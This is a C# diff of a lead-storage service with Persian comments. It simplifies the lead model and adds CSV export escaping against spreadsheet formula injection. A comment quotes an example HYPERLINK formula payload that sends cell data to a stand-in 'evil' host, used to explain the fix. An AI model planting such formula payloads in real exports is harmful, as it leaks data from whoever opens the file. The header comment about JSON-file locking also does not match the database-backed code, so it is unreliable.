@@ -1,168 +1,127 @@
 using System.Globalization;
+using System.Text;
 using System.Text.Json;
 using System.Text.Json.Serialization;
-using Microsoft.EntityFrameworkCore;
-using Up2Ai.Data;
 
 namespace Up2Ai.Services;
-
-/// <summary>Lead workflow status constants.</summary>
-public static class LeadStatus
-{
-    public const string New = "new";
-    public const string Contacted = "contacted";
-    public const string FollowUp = "follow_up";
-    public const string Done = "done";
-
-    public static readonly string[] All = { New, Contacted, FollowUp, Done };
-
-    public static bool IsValid(string? status) => All.Contains(status);
-}
 
 public sealed class Lead
 {
     [JsonPropertyName("id")] public string Id { get; set; } = "";
-    [JsonPropertyName("at")] public string At { get; set; } = "";
+    [JsonPropertyName("at")] public string At { get; set; } = "";     // ISO timestamp
     [JsonPropertyName("name")] public string Name { get; set; } = "";
     [JsonPropertyName("reach")] public string Reach { get; set; } = "";
     [JsonPropertyName("business")] public string Business { get; set; } = "";
     [JsonPropertyName("service")] public string Service { get; set; } = "";
     [JsonPropertyName("need")] public string Need { get; set; } = "";
-    [JsonPropertyName("status")] public string? Status { get; set; }
-    [JsonPropertyName("lastContactedAt")] public string? LastContactedAt { get; set; }
-    [JsonPropertyName("internalNotes")] public string? InternalNotes { get; set; }
-    [JsonPropertyName("handled")] [JsonIgnore(Condition = JsonIgnoreCondition.WhenWriting)]
-    public bool Handled { get; set; }
+    [JsonPropertyName("handled")] public bool Handled { get; set; }
 }
 
+/// <summary>
+/// صندوق لید.
+///
+/// هر ارسالِ فرم تماس همین‌جا ذخیره می‌شود — صرف‌نظر از این‌که واتساپ/ایمیل پر
+/// شده باشد یا نه — تا هیچ لیدی بی‌سروصدا گم نشود. یک فایل JSON ساده است، نه
+/// پایگاه‌داده: حجم واقعی (چند ده لید در ماه) توجیه‌کننده‌ی پایگاه‌داده نیست.
+///
+/// ┌────────────────────────────────────────────────────────────────────────┐
+/// │ تفاوت مهم با نسخه‌ی Node: آن‌جا یک «صف درون‌فرآیندی» کافی بود، چون همه‌ی │
+/// │ درخواست‌ها در یک پردازه‌ی واحد اجرا می‌شدند. این‌جا ASP.NET درخواست‌ها را │
+/// │ هم‌زمان و چندنخی اجرا می‌کند و ممکن است چند نمونه از برنامه هم بالا     │
+/// │ باشد، پس قفل واقعیِ فایل لازم است — نه قفل درون‌حافظه‌ای.                │
+/// │ این‌جا هر دو گذاشته شده: یک قفل نخی برای داخل همین پردازه، و یک قفل     │
+/// │ روی خود فایل (FileShare.None با تلاش مجدد) برای بین پردازه‌ها.          │
+/// └────────────────────────────────────────────────────────────────────────┘
+/// </summary>
 public sealed class LeadStore
 {
-    private readonly AppDbContext _db;
-    private readonly ILogger<LeadStore> _log;
+    private readonly IRecordStore<Lead> _store;
 
-    public LeadStore(AppDbContext db, ILogger<LeadStore> log)
+    public LeadStore(StorageFactory storage, ILogger<LeadStore> log)
     {
-        _db = db;
-        _log = log;
+        _store = storage.Records<Lead>(Pg.PgSchema.Leads, l => l.Id,
+            l => l.Id.Length > 0 && l.At.Length > 0 && l.Name.Length > 0, log);
     }
 
-    public async Task<Lead> AddAsync(string name, string reach, string business, string service, string need)
-    {
-        var entity = new LeadEntity
+    public Task<Lead> AddAsync(string name, string reach, string business, string service, string need) =>
+        _store.MutateAsync(leads =>
         {
-            Id = Guid.NewGuid().ToString(),
-            CreatedAt = DateTimeOffset.UtcNow,
-            Name = name.Trim(),
-            Reach = reach.Trim(),
-            Business = string.IsNullOrWhiteSpace(business) ? null : business.Trim(),
-            Service = service.Trim(),
-            Need = need.Trim(),
-            Status = LeadStatus.New,
-            InternalNotes = null,
-            LastContactedAt = null,
-        };
+            var lead = new Lead
+            {
+                Id = Guid.NewGuid().ToString(),
+                At = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ", CultureInfo.InvariantCulture),
+                Handled = false,
+                Name = name,
+                Reach = reach,
+                Business = business,
+                Service = service,
+                Need = need,
+            };
+            leads.Add(lead);
+            return (true, lead);
+        });
 
-        _db.Leads.Add(entity);
-        await _db.SaveChangesAsync();
+    /// <summary>تازه‌ترین بالا.</summary>
+    public List<Lead> List() =>
+        _store.Read()
+            .OrderByDescending(l => l.At, StringComparer.Ordinal)
+            .ToList();
 
-        return entity.ToModel();
-    }
+    public Task<bool> SetHandledAsync(string id, bool handled) =>
+        _store.MutateAsync(leads =>
+        {
+            var lead = leads.FirstOrDefault(l => l.Id == id);
+            if (lead is null) return (false, false);
+            lead.Handled = handled;
+            return (true, true);
+        });
 
-    public async Task<List<Lead>> ListAsync()
-    {
-        var rows = await _db.Leads
-            .AsNoTracking()
-            .OrderByDescending(x => x.CreatedAt)
-            .ToListAsync();
+    public Task<bool> DeleteAsync(string id) =>
+        _store.MutateAsync(leads =>
+        {
+            var removed = leads.RemoveAll(l => l.Id == id);
+            return (removed > 0, removed > 0);
+        });
 
-        return rows.Select(x => x.ToModel()).ToList();
-    }
-
-    public List<Lead> List() => ListAsync().GetAwaiter().GetResult();
-
-    public async Task<bool> SetStatusAsync(string id, string status)
-    {
-        if (!LeadStatus.IsValid(status)) return false;
-
-        var entity = await _db.Leads.FindAsync(id);
-        if (entity is null) return false;
-
-        entity.Status = status;
-        await _db.SaveChangesAsync();
-        return true;
-    }
-
-    public async Task<bool> SetContactedAsync(string id)
-    {
-        var entity = await _db.Leads.FindAsync(id);
-        if (entity is null) return false;
-
-        entity.LastContactedAt = DateTimeOffset.UtcNow;
-        entity.Status = LeadStatus.Contacted;
-        await _db.SaveChangesAsync();
-        return true;
-    }
-
-    public async Task<bool> SetNotesAsync(string id, string? notes)
-    {
-        var entity = await _db.Leads.FindAsync(id);
-        if (entity is null) return false;
-
-        var maxNotes = 5000;
-        if (!string.IsNullOrEmpty(notes) && notes.Length > maxNotes)
-            notes = notes.Substring(0, maxNotes);
-
-        entity.InternalNotes = string.IsNullOrWhiteSpace(notes) ? null : notes.Trim();
-        await _db.SaveChangesAsync();
-        return true;
-    }
-
-    public async Task<bool> DeleteAsync(string id)
-    {
-        var entity = await _db.Leads.FindAsync(id);
-        if (entity is null) return false;
-
-        _db.Leads.Remove(entity);
-        await _db.SaveChangesAsync();
-        return true;
-    }
-
+    /// <summary>
+    /// خروجی CSV — با BOM تا اکسل فارسی را درست نشان بدهد.
+    ///
+    /// نکته‌ی امنیتی: محتوای این فایل را *بازدیدکننده‌ها* می‌نویسند (فرم تماس
+    /// عمومی است) و بعد مدیر آن را در اکسل باز می‌کند. اکسل هر سلولی را که با
+    /// = یا + یا - یا @@ شروع شود «فرمول» می‌فهمد و اجرا می‌کند — حتی وقتی
+    /// سلول داخل گیومه باشد. یعنی یک نفر می‌توانست در فیلد نام
+    /// `=HYPERLINK("http://evil/"&amp;A1,"باز کن")` بنویسد و روی کامپیوترِ
+    /// مدیر اجرا شود. راه‌حل استاندارد (توصیه‌ی OWASP): یک آپاستروف پیش از
+    /// این کاراکترها که اکسل آن را «این سلول متن است» می‌فهمد و نمایش هم
+    /// نمی‌دهد.
+    /// </summary>
     public static string ToCsv(IEnumerable<Lead> leads)
     {
         var fa = new CultureInfo("fa-IR");
-        string Esc(string s) => "\"" + s.Replace("\"", "\"\"") + "\"";
 
-        var headers = new[] { "تاریخ", "نام", "راه ارتباطی", "کسب‌وکار", "حوزه", "نیاز", "وضعیت", "آخرین تماس", "یادداشت" };
+        string Esc(string s)
+        {
+            var v = s ?? "";
+            if (v.Length > 0 && (v[0] is '=' or '+' or '-' or '@' or '\t' or '\r'))
+                v = "'" + v;
+            return "\"" + v.Replace("\"", "\"\"") + "\"";
+        }
+
+        var headers = new[] { "تاریخ", "نام", "راه ارتباطی", "کسب‌وکار", "حوزه", "نیاز", "پیگیری شد" };
         var lines = new List<string> { string.Join(",", headers.Select(Esc)) };
 
         foreach (var l in leads)
         {
-            var when = DateTimeOffset.TryParse(l.At, out var dt)
-                ? dt.ToLocalTime().ToString("d MMMM yyyy'، 'H:mm", fa)
+            var when = DateTime.TryParse(l.At, CultureInfo.InvariantCulture,
+                DateTimeStyles.RoundtripKind, out var dt)
+                ? dt.ToLocalTime().ToString(fa)
                 : l.At;
-
-            var lastContacted = string.IsNullOrEmpty(l.LastContactedAt)
-                ? ""
-                : (DateTimeOffset.TryParse(l.LastContactedAt, out var ldt)
-                    ? ldt.ToLocalTime().ToString("d MMMM yyyy'، 'H:mm", fa)
-                    : l.LastContactedAt);
-
             lines.Add(string.Join(",", new[]
             {
-                when, l.Name, l.Reach, l.Business, l.Service, l.Need,
-                StatusToPersian(l.Status ?? LeadStatus.New), lastContacted, l.InternalNotes ?? "",
+                when, l.Name, l.Reach, l.Business, l.Service, l.Need, l.Handled ? "بله" : "خیر",
             }.Select(Esc)));
         }
 
         return "﻿" + string.Join("\r\n", lines);
     }
-
-    private static string StatusToPersian(string status) => status switch
-    {
-        LeadStatus.New => "جدید",
-        LeadStatus.Contacted => "تماس گرفته شد",
-        LeadStatus.FollowUp => "پیگیری مورد نیاز",
-        LeadStatus.Done => "انجام شده",
-        _ => status,
-    };
 }
